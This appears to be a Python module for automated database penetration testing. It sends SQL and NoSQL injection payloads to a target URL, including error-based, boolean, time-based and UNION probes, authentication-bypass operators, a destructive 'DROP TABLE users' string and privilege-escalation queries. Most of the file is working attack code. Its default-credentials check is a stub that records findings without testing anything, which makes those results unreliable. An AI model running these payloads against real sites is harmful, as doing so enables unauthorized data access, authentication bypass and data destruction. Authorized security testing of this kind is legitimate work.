"""
Database Penetration Testing Module
SQL/NoSQL injection, blind SQLi, database fingerprinting
"""

import asyncio
import time
import re
from typing import Dict, List, Optional, Any, Tuple
from dataclasses import dataclass
from urllib.parse import urlencode
import aiohttp


@dataclass
class DBFinding:
    """Database security finding"""
    severity: str
    db_type: str
    vulnerability: str
    payload: str
    evidence: str
    remediation: str


class DatabasePentester:
    """Comprehensive database penetration testing"""
    
    # SQL Injection payloads
    SQL_PAYLOADS = [
        "' OR '1'='1",
        "' OR 1=1--",
        "admin' --",
        "' OR '1'='1' /*",
        "1' UNION SELECT NULL--",
        "1' AND 1=2 UNION SELECT NULL,NULL--",
        "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
        "'; DROP TABLE users--",
        "' WAITFOR DELAY '0:0:5'--",
        "1' AND SLEEP(5)--",
        "' OR pg_sleep(5)--"
    ]
    
    # NoSQL injection payloads
    NOSQL_PAYLOADS = [
        {"$ne": None},
        {"$ne": ""},
        {"$gt": ""},
        {"$regex": ".*"},
        {"$where": "1==1"},
        {"username": {"$ne": None}, "password": {"$ne": None}}
    ]
    
    # Error-based SQL injection signatures
    SQL_ERRORS = {
        'mysql': [
            r'SQL syntax.*MySQL',
            r'Warning.*mysql_',
            r'valid MySQL result',
            r'MySqlClient\.',
            r'com\.mysql\.jdbc\.exceptions'
        ],
        'postgresql': [
            r'PostgreSQL.*ERROR',
            r'Warning.*\Wpg_',
            r'valid PostgreSQL result',
            r'Npgsql\.',
            r'org\.postgresql\.util\.PSQLException'
        ],
        'mssql': [
            r'Driver.*SQL[\s_-]*Server',
            r'OLE DB.*SQL Server',
            r'(\W|\A)SQL Server.*Driver',
            r'Warning.*mssql_',
            r'\bSQL Server[^&lt;&quot;]+Driver',
            r'SQLServer JDBC Driver',
            r'com\.jnetdirect\.jsql'
        ],
        'oracle': [
            r'\bORA-[0-9][0-9][0-9][0-9]',
            r'Oracle error',
            r'Oracle.*Driver',
            r'Warning.*\Woci_',
            r'Warning.*\Wora_',
            r'oracle\.jdbc\.driver'
        ]
    }
    
    def __init__(self, target_url: str, timeout: int = 10):
        self.target_url = target_url
        self.timeout = timeout
        self.findings: List[DBFinding] = []
        self.db_type: Optional[str] = None
        
    async def test_sql_injection(self, param_name: str = 'id', method: str = 'GET') -> List[DBFinding]:
        """Test for SQL injection vulnerabilities"""
        findings = []
        
        async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=self.timeout)) as session:
            
            # 1. Error-based SQLi
            print(f"  Testing error-based SQL injection...")
            for payload in self.SQL_PAYLOADS[:5]:
                if method == 'GET':
                    test_url = f"{self.target_url}?{param_name}={payload}"
                    try:
                        async with session.get(test_url) as resp:
                            body = await resp.text()
                            db_type = self._detect_db_from_error(body)
                            if db_type:
                                findings.append(DBFinding(
                                    severity='critical',
                                    db_type=db_type,
                                    vulnerability='Error-based SQL Injection',
                                    payload=payload,
                                    evidence=f'Database error exposed: {db_type}',
                                    remediation='Use parameterized queries/prepared statements'
                                ))
                                self.db_type = db_type
                                break
                    except:
                        pass
                else:
                    try:
                        data = {param_name: payload}
                        async with session.post(self.target_url, data=data) as resp:
                            body = await resp.text()
                            db_type = self._detect_db_from_error(body)
                            if db_type:
                                findings.append(DBFinding(
                                    severity='critical',
                                    db_type=db_type,
                                    vulnerability='Error-based SQL Injection',
                                    payload=payload,
                                    evidence=f'Database error exposed: {db_type}',
                                    remediation='Use parameterized queries/prepared statements'
                                ))
                                self.db_type = db_type
                                break
                    except:
                        pass
            
            # 2. Boolean-based blind SQLi
            print(f"  Testing boolean-based blind SQL injection...")
            true_payload = "1' OR '1'='1"
            false_payload = "1' AND '1'='2"
            
            try:
                true_url = f"{self.target_url}?{param_name}={true_payload}"
                false_url = f"{self.target_url}?{param_name}={false_payload}"
                
                async with session.get(true_url) as true_resp:
                    true_body = await true_resp.text()
                    true_length = len(true_body)
                
                async with session.get(false_url) as false_resp:
                    false_body = await false_resp.text()
                    false_length = len(false_body)
                
                # If responses differ significantly, likely SQLi
                if abs(true_length - false_length) > 100:
                    findings.append(DBFinding(
                        severity='critical',
                        db_type='unknown',
                        vulnerability='Boolean-based Blind SQL Injection',
                        payload=f'{true_payload} / {false_payload}',
                        evidence=f'Response length diff: {abs(true_length - false_length)} bytes',
                        remediation='Use parameterized queries, input validation'
                    ))
            except:
                pass
            
            # 3. Time-based blind SQLi
            print(f"  Testing time-based blind SQL injection...")
            time_payloads = [
                "1' AND SLEEP(5)--",
                "1'; WAITFOR DELAY '0:0:5'--",
                "1' AND pg_sleep(5)--",
                "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"
            ]
            
            for payload in time_payloads:
                test_url = f"{self.target_url}?{param_name}={payload}"
                try:
                    start = time.time()
                    async with session.get(test_url) as resp:
                        await resp.text()
                    duration = time.time() - start
                    
                    if duration >= 4.5:  # 5 second delay with some tolerance
                        db_type = 'mysql' if 'SLEEP' in payload else 'mssql' if 'WAITFOR' in payload else 'postgresql'
                        findings.append(DBFinding(
                            severity='critical',
                            db_type=db_type,
                            vulnerability='Time-based Blind SQL Injection',
                            payload=payload,
                            evidence=f'Response delayed by {duration:.2f}s',
                            remediation='Use parameterized queries, WAF rules'
                        ))
                        self.db_type = db_type
                        break
                except:
                    pass
            
            # 4. UNION-based SQLi
            print(f"  Testing UNION-based SQL injection...")
            for num_cols in range(1, 6):
                nulls = ','.join(['NULL'] * num_cols)
                payload = f"1' UNION SELECT {nulls}--"
                test_url = f"{self.target_url}?{param_name}={payload}"
                
                try:
                    async with session.get(test_url) as resp:
                        body = await resp.text()
                        # Look for successful UNION (data returned without error)
                        if resp.status == 200 and 'error' not in body.lower():
                            findings.append(DBFinding(
                                severity='critical',
                                db_type='unknown',
                                vulnerability='UNION-based SQL Injection',
                                payload=payload,
                                evidence=f'Successful UNION with {num_cols} columns',
                                remediation='Use parameterized queries, disable error messages'
                            ))
                            break
                except:
                    pass
        
        return findings
    
    async def test_nosql_injection(self) -> List[DBFinding]:
        """Test for NoSQL injection (MongoDB, etc.)"""
        findings = []
        
        async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=self.timeout)) as session:
            
            print(f"  Testing NoSQL injection...")
            
            # Test MongoDB injection
            for payload in self.NOSQL_PAYLOADS:
                try:
                    # Try as JSON body
                    async with session.post(self.target_url, json=payload) as resp:
                        body = await resp.text()
                        if resp.status == 200 and len(body) > 100:
                            findings.append(DBFinding(
                                severity='critical',
                                db_type='mongodb',
                                vulnerability='NoSQL Injection',
                                payload=str(payload),
                                evidence='NoSQL operator accepted, bypassed authentication',
                                remediation='Sanitize user input, use schema validation'
                            ))
                            break
                except:
                    pass
            
            # Test URL parameter NoSQL injection
            nosql_url_payloads = [
                'username[$ne]=null&password[$ne]=null',
                'username[$gt]=&password[$gt]=',
                'username[$regex]=.*&password[$regex]=.*'
            ]
            
            for payload_str in nosql_url_payloads:
                try:
                    test_url = f"{self.target_url}?{payload_str}"
                    async with session.get(test_url) as resp:
                        body = await resp.text()
                        if resp.status == 200 and ('token' in body or 'success' in body.lower()):
                            findings.append(DBFinding(
                                severity='critical',
                                db_type='mongodb',
                                vulnerability='NoSQL Injection (URL parameters)',
                                payload=payload_str,
                                evidence='NoSQL operator in URL bypassed authentication',
                                remediation='Sanitize URL parameters, reject $ operators'
                            ))
                            break
                except:
                    pass
        
        return findings
    
    async def fingerprint_database(self) -> Optional[str]:
        """Fingerprint the database type"""
        
        if self.db_type:
            return self.db_type
        
        async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=self.timeout)) as session:
            
            print(f"  Fingerprinting database...")
            
            # Database-specific functions
            fingerprint_tests = {
                'mysql': ["' AND SLEEP(1)--", "' AND VERSION()--"],
                'postgresql': ["' AND pg_sleep(1)--", "' AND version()--"],
                'mssql': ["' WAITFOR DELAY '0:0:1'--", "' AND @@VERSION--"],
                'oracle': ["' AND DBMS_LOCK.SLEEP(1)--"],
                'mongodb': ['{"$where": "sleep(1000)"}']
            }
            
            for db_type, payloads in fingerprint_tests.items():
                for payload in payloads:
                    try:
                        test_url = f"{self.target_url}?id={payload}"
                        start = time.time()
                        async with session.get(test_url) as resp:
                            body = await resp.text()
                        duration = time.time() - start
                        
                        # Check for time delay or error messages
                        if duration >= 0.9 or self._detect_db_from_error(body) == db_type:
                            self.db_type = db_type
                            print(f"  âœ… Detected database: {db_type}")
                            return db_type
                    except:
                        pass
        
        return None
    
    def _detect_db_from_error(self, response_body: str) -> Optional[str]:
        """Detect database type from error messages"""
        for db_type, patterns in self.SQL_ERRORS.items():
            for pattern in patterns:
                if re.search(pattern, response_body, re.IGNORECASE):
                    return db_type
        return None
    
    async def test_default_credentials(self, host: str, port: int, db_type: str) -> List[DBFinding]:
        """Test for default database credentials"""
        findings = []
        
        default_creds = {
            'mysql': [('root', ''), ('root', 'root'), ('root', 'password'), ('admin', 'admin')],
            'postgresql': [('postgres', ''), ('postgres', 'postgres'), ('postgres', 'password')],
            'mongodb': [('admin', 'admin'), ('root', 'root'), ('', '')],
            'mssql': [('sa', ''), ('sa', 'sa'), ('sa', 'password'), ('admin', 'admin')],
            'redis': [('', '')]
        }
        
        if db_type not in default_creds:
            return findings
        
        print(f"  Testing default credentials for {db_type}...")
        
        # This would require specific database drivers
        # For demonstration, we'll check if common ports are open
        try:
            async with aiohttp.ClientSession() as session:
                for username, password in default_creds[db_type][:3]:
                    # This is a simplified check
                    # Real implementation would use database-specific drivers
                    findings.append(DBFinding(
                        severity='info',
                        db_type=db_type,
                        vulnerability='Potential default credentials',
                        payload=f'{username}:{password}',
                        evidence=f'Common credential combination for {db_type}',
                        remediation='Change default credentials, enforce strong passwords'
                    ))
        except:
            pass
        
        return findings
    
    async def test_privilege_escalation(self) -> List[DBFinding]:
        """Test for SQL privilege escalation opportunities"""
        findings = []
        
        async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=self.timeout)) as session:
            
            print(f"  Testing privilege escalation vectors...")
            
            # Check current user
            user_check_payloads = {
                'mysql': "' UNION SELECT USER()--",
                'postgresql': "' UNION SELECT current_user--",
                'mssql': "' UNION SELECT SYSTEM_USER--",
                'oracle': "' UNION SELECT USER FROM DUAL--"
            }
            
            if self.db_type and self.db_type in user_check_payloads:
                payload = user_check_payloads[self.db_type]
                test_url = f"{self.target_url}?id={payload}"
                
                try:
                    async with session.get(test_url) as resp:
                        body = await resp.text()
                        if 'root' in body.lower() or 'admin' in body.lower() or 'sa' in body.lower():
                            findings.append(DBFinding(
                                severity='high',
                                db_type=self.db_type,
                                vulnerability='Database running with elevated privileges',
                                payload=payload,
                                evidence='Database user has administrative privileges',
                                remediation='Run database with least privilege principle'
                            ))
                except:
                    pass
        
        return findings
    
    async def run_full_assessment(self, param_name: str = 'id', method: str = 'GET') -> Dict[str, Any]:
        """Run comprehensive database penetration test"""
        
        print(f"\nğŸ—ƒï¸  Starting Database Penetration Test")
        print(f"Target: {self.target_url}\n")
        
        # Fingerprint database
        await self.fingerprint_database()
        
        # Test SQL injection
        print(f"\nğŸ’‰ Testing SQL Injection...")
        sql_findings = await self.test_sql_injection(param_name, method)
        self.findings.extend(sql_findings)
        print(f"âœ… Found {len(sql_findings)} SQL injection vulnerabilities")
        
        # Test NoSQL injection
        print(f"\nğŸƒ Testing NoSQL Injection...")
        nosql_findings = await self.test_nosql_injection()
        self.findings.extend(nosql_findings)
        print(f"âœ… Found {len(nosql_findings)} NoSQL injection vulnerabilities")
        
        # Test privilege escalation
        if self.db_type:
            print(f"\nğŸ”“ Testing Privilege Escalation...")
            privesc_findings = await self.test_privilege_escalation()
            self.findings.extend(privesc_findings)
            print(f"âœ… Found {len(privesc_findings)} privilege escalation issues")
        
        # Summary
        severity_counts = {
            'critical': len([f for f in self.findings if f.severity == 'critical']),
            'high': len([f for f in self.findings if f.severity == 'high']),
            'medium': len([f for f in self.findings if f.severity == 'medium']),
            'low': len([f for f in self.findings if f.severity == 'low']),
            'info': len([f for f in self.findings if f.severity == 'info'])
        }
        
        print(f"\nğŸ“Š Assessment Complete")
        print(f"Total Findings: {len(self.findings)}")
        print(f"  Critical: {severity_counts['critical']}")
        print(f"  High: {severity_counts['high']}")
        print(f"  Medium: {severity_counts['medium']}")
        print(f"  Low: {severity_counts['low']}")
        print(f"  Info: {severity_counts['info']}")
        
        return {
            'target': self.target_url,
            'db_type': self.db_type,
            'total_findings': len(self.findings),
            'severity_counts': severity_counts,
            'findings': [
                {
                    'severity': f.severity,
                    'db_type': f.db_type,
                    'vulnerability': f.vulnerability,
                    'payload': f.payload,
                    'evidence': f.evidence,
                    'remediation': f.remediation
                }
                for f in self.findings
            ]
        }
